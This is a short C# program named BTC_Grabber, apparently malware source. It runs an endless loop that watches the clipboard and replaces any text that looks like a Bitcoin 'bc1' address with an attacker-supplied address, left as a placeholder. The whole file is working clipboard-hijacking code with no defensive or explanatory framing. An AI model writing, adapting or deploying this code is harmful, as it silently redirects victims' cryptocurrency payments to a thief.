namespace BTC_Grabber
{
    internal static class Program
    {
        [STAThread]
        static void Main()
        {
            string new_CB = "Enter_BTC_address_here";
            while (true)
            {
                string CB = Clipboard.GetText(TextDataFormat.Text);
                
                if (CB.Length >= 3)
                {
                    string chars = CB.Substring(0, 3);
                    
                    if (chars == "bc1")
                    {
                        if (CB.Length == 27)
                        {
                            Clipboard.SetText(new_CB);
                        }
                        else if (CB.Length == 34)
                        {
                            Clipboard.SetText(new_CB);
                        }
                    }
                }    
            }
        }
    }
}